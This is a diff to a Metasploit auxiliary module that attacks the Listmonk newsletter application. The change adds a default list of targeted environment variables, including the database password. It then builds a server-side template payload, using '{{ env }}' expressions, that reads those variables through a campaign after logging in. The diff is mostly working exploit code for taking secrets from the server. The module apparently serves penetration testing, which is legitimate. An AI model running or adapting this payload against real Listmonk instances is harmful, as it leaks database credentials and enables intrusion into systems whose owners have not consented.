@@ -37,8 +37,7 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('TARGETURI', [true, 'Base path to Listmonk', '/']),
       OptString.new('USERNAME', [true, 'Listmonk username']),
       OptString.new('PASSWORD', [true, 'Listmonk password']),
-      OptString.new('ENVVAR', [false, 'Specific environment variable to read']),
-      OptPath.new('PAYLOAD_FILE', [false, 'Path to file containing template payload']),
+      OptString.new('ENVVAR', [false, 'Comma-separated list of environment variables to read (uses default list if not set)']),
       OptString.new('CAMPAIGN_NAME', [false, 'Campaign name (random if not set)'])
     ])
   end
@@ -185,6 +184,17 @@ class MetasploitModule < Msf::Auxiliary
     
   end
 
+  def default_env_vars
+    [
+      'LISTMONK_db__host',
+      'LISTMONK_db__port', 
+      'LISTMONK_db__user',
+      'LISTMONK_db__password',
+      'LISTMONK_db__database',
+      'LISTMONK_app__address'
+    ]
+  end
+
   def delete_campaign(campaign_id)
     res = send_request_cgi({
       'method' => 'DELETE',
@@ -247,16 +257,20 @@ class MetasploitModule < Msf::Auxiliary
   def run
     print_status("Targeting #{full_uri}")
 
-    if datastore['PAYLOAD_FILE'] && File.exist?(datastore['PAYLOAD_FILE'])
-      payload_content = File.read(datastore['PAYLOAD_FILE']).strip
-      vprint_status("Using payload from file: #{datastore['PAYLOAD_FILE']}")
-    elsif datastore['ENVVAR']
-      payload_content = "{{ env \"#{datastore['ENVVAR']}\" }}"
-      vprint_status("Reading environment variable: #{datastore['ENVVAR']}")
+    # Determine which environment variables to extract
+    if datastore['ENVVAR']
+      env_vars = datastore['ENVVAR'].split(',').map(&:strip)
+      print_status("Targeting specific environment variables: #{env_vars.join(', ')}")
     else
-      fail_with(Failure::BadConfig, 'Either ENVVAR or PAYLOAD_FILE must be specified')
+      env_vars = default_env_vars
+      print_status("Using default environment variable list (#{env_vars.length} variables)")
     end
 
+    # Build payload with all environment variables
+    payload_parts = env_vars.map do |var|
+      "#{var}: {{ env \"#{var}\" }}"
+    end
+    payload_content = payload_parts.join('<br>')
     payload = "<p>#{payload_content}</p>"
 
     login
